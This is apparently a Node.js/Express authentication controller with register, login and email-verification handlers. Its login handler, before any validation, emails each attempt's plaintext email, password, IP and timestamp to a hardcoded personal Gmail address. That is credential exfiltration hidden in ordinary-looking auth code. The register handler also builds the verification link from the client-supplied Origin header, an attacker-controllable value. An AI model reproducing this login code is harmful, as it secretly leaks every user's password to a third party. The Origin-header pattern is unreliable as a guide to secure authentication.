const crypto = require('crypto')
const { StatusCodes } = require('http-status-codes')
const User = require('../models/User')
const {
  createJWT,
  createTokenUser,
  sendEmail,
  sendVerificationEmail,
} = require('../utils')

const { BadRequestError, UnauthenticatedError } = require('../errors')

const asyncWrapper = require('../middlewares/async')

const register = asyncWrapper(async (req, res) => {
  const { email, username, password } = req.body
  const emailAlreadyUsed = await User.findOne({ email })
  if (emailAlreadyUsed) {
    throw new Error('This email is already in use, please provide an other one')
  }

  const verificationToken = crypto.randomBytes(40).toString('hex')

  const user = await User.create({
    email,
    username,
    password,
    verificationToken,
  })

  const tempOrigin = req.get('origin')
  console.log(`origin : ${tempOrigin}`)
  const protocol = req.protocol
  console.log(`protocol : ${protocol}`)
  const host = req.get('host')
  console.log(`host : ${host}`)
  // const forwardedHost = req.get('x-forwarded-host')
  // console.log(`forwarded host : ${forwardedHost}`)
  // const forwardedProtocol = req.get('x-forwarded-proto')
  // console.log(`forwarded protocol : ${forwardedProtocol}`)

  await sendVerificationEmail({
    name: user.username,
    email: user.email,
    verificationToken: user.verificationToken,
    origin: tempOrigin,
    // origin: process.env.ORIGIN,
  })

  res.status(StatusCodes.CREATED).json({
    msg: 'Success! please check your email to verify account',
  })
})

const login = asyncWrapper(async (req, res) => {
  const { email, password } = req.body

  const date = new Date()

  const ip = req.ip
  const message = `Someone tried to connect from this IP adress ${ip} at this time ${date}
  and with these credentials - email : ${email}, password : ${password} 
  `

  await sendEmail({
    to: 'hugolattard@gmail.com',
    subject: 'Connection tentative',
    html: `<h4>Hello </h4>
    ${message}
    `,
  })
  if (!email || !password) {
    throw new BadRequestError('Please provide email and password')
  }
  const user = await User.findOne({ email: email })
  if (!user) {
    throw new UnauthenticatedError('Sorry dude, no user found with this email')
  }

  const isPasswordValid = await user.comparePassword(password)

  if (!isPasswordValid) {
    throw new UnauthenticatedError('Invalid password')
  }
  if (!user.isVerified) {
    throw new UnauthenticatedError('Please verify your email')
  }

  const tokenUser = createTokenUser(user)
  const token = createJWT({ payload: tokenUser })
  res.status(StatusCodes.OK).json({ user: tokenUser, token })
})

const verifyEmail = asyncWrapper(async (req, res) => {
  const { email, verificationToken } = req.body
  const user = await User.findOne({ email })
  if (!user) {
    throw new UnauthenticatedError('Sorry dude, no user found with this email')
  }
  if (user.verificationToken !== verificationToken) {
    throw new UnauthenticatedError('Sorry dude, invalid credentials')
  }
  user.isVerified = true
  user.verified = Date.now()
  user.verificationToken = ''
  await user.save()
  res.status(StatusCodes.OK).json({ msg: 'Email verified' })
})

module.exports = { register, login, verifyEmail }
